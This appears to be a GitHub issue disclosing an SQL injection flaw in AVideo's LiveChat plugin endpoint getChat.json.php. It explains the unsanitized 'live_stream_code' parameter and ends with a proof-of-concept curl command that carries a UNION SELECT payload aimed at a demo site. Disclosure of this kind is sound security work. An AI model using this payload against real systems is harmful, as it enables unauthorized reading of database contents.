## Description

![@EgidioRomano](https://avatars.githubusercontent.com/u/57233361?u=2ed41815d7b517082c9e86a7da4e55a49b705d00&v=4&size=48)[EgidioRomano](https://github.com/EgidioRomano)opened [on Oct 31, 2019](https://github.com/WWBN/AVideo/issues/2202#issue-515651115)

User input passed through the "live\_stream\_code" POST parameter to **/plugin/LiveChat/getChat.json.php** is not properly sanitized before being used to construct a SQL query. This can be exploited by malicious users to e.g. read sensitive data from the database through in-band SQL Injection attacks. Successful exploitation of this vulnerability requires the "Live Chat" plugin to be enabled.

Proof of Concept:

```
curl -X POST -d "live_stream_code=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,VERSION(),31,32,33,34,35,36#" https://demo.youphptube.com/plugin/LiveChat/getChat.json.php
